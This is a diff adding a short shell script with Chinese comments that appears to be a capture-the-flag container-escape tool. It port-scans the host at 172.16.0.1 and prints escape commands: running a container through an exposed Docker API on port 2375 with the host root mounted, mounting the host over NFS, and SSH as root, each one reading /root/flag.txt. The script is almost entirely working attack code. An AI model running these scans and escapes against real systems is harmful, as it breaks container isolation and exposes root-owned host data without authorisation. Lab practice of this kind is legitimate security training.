@@ -1,0 +1,32 @@
+```shell
+#!/bin/sh
+
+HOST="172.16.0.1"
+
+echo "🔍 开始探测宿主机 $HOST 端口..."
+
+# 检测 nc 是否可用
+if command -v nc >/dev/null 2>&1; then
+    echo "使用 nc 进行探测"
+    for port in 22 80 443 2375 2376 2049 111 8080 8888 3000 5000 7000 8000 9000 3306 6379 9200 5601; do
+        timeout 1 nc -zv $HOST $port 2>&1 | grep -q succeeded && echo "✅ $port 开放" || echo "❌ $port 关闭"
+    done
+elif command -v nmap >/dev/null 2>&1; then
+    echo "使用 nmap 进行探测"
+    nmap -p 22,80,443,2375,2376,2049,111,8080,8888,3000,5000,7000,8000,9000,3306,6379,9200,5601 $HOST
+else
+    echo "使用 /dev/tcp 进行探测"
+    for port in 22 80 443 2375 2376 2049 111 8080 8888 3000 5000 7000 8000 9000 3306 6379 9200 5601; do
+        (echo >/dev/tcp/$HOST/$port) 2>/dev/null && echo "✅ $port 开放" || echo "❌ $port 关闭"
+    done
+fi
+
+echo -e "\n🎯 如果发现 2375 端口开放，执行以下命令逃逸："
+echo "docker -H tcp://172.16.0.1:2375 run --rm -v /:/host alpine cat /host/root/flag.txt"
+
+echo -e "\n📁 如果发现 2049 端口开放，执行以下命令："
+echo "mkdir -p /mnt/host && mount -t nfs 172.16.0.1:/ /mnt/host && cat /mnt/host/root/flag.txt"
+
+echo -e "\n🔑 如果发现 22 端口开放，尝试 SSH："
+echo "ssh root@172.16.0.1 'cat /root/flag.txt'"
+```
